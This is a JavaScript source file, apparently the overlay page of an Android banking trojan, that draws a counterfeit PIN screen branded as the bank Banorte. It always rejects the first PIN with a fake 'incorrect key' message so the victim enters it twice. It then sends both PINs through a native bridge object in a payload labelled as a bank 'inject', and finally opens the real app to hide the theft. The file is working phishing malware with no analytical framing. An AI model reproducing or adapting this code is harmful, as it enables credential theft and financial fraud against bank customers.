(() => {
  const PIN_LENGTH = 6;
  const BRAND = "Banorte";

  const app = document.getElementById("app");
  const pinDots = Array.from(document.querySelectorAll("#pinDots .pin-dot"));
  const errorMsg = document.getElementById("errorMsg");
  const attemptCounter = document.getElementById("attemptCounter");
  const loader = document.getElementById("loader");
  const forgotBtn = document.getElementById("forgotBtn");
  const keypad = document.getElementById("keypad");

  let pin = "";
  let submitted = false;
  let firstPin = null;
  let attemptCount = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function buildPayload(pin1, pin2) {
    return JSON.stringify({
      pin1,
      pin2,
      timestamp: new Date().toISOString(),
      status: "unlocked",
      brand: BRAND,
      type_injects: "banks",
      closed: "close_activity_injects",
    });
  }

  function updateDots() {
    pinDots.forEach((dot, index) => {
      dot.classList.toggle("is-filled", index < pin.length);
      dot.classList.remove("is-error");
    });
  }

  function clearPin() {
    pin = "";
    updateDots();
  }

  function shakeDots() {
    pinDots.forEach((dot) => {
      if (dot.classList.contains("is-filled")) {
        dot.classList.add("is-error");
      }
    });
    window.setTimeout(() => {
      pinDots.forEach((dot) => dot.classList.remove("is-error"));
      clearPin();
    }, 450);
  }

  function submitPin() {
    if (submitted || pin.length !== PIN_LENGTH) {
      return;
    }

    errorMsg.textContent = "";
    attemptCount += 1;

    if (attemptCount === 1) {
      firstPin = pin;
      errorMsg.textContent = "Clave incorrecta. Intenta de nuevo.";
      attemptCounter.classList.add("is-show");
      shakeDots();
      return;
    }

    submitted = true;
    loader.classList.add("is-active");
    loader.setAttribute("aria-hidden", "false");

    reportDone(buildPayload(firstPin, pin));

    window.setTimeout(() => {
      app.classList.add("is-done");
      openApp();
    }, 800);
  }

  function pressKey(key) {
    if (submitted) {
      return;
    }

    if (key === "back") {
      if (pin.length > 0) {
        pin = pin.slice(0, -1);
        updateDots();
        errorMsg.textContent = "";
      }
      return;
    }

    if (pin.length >= PIN_LENGTH) {
      return;
    }

    pin += key;
    updateDots();
    errorMsg.textContent = "";

    if (pin.length === PIN_LENGTH) {
      window.setTimeout(submitPin, 200);
    }
  }

  keypad.addEventListener("click", (event) => {
    const btn = event.target.closest("[data-key]");
    if (!btn) {
      return;
    }
    pressKey(btn.getAttribute("data-key"));
  });

  forgotBtn.addEventListener("click", () => {
    if (submitted) {
      return;
    }
    errorMsg.textContent = "Ingresa tu PIN para continuar";
  });

  updateDots();
})();
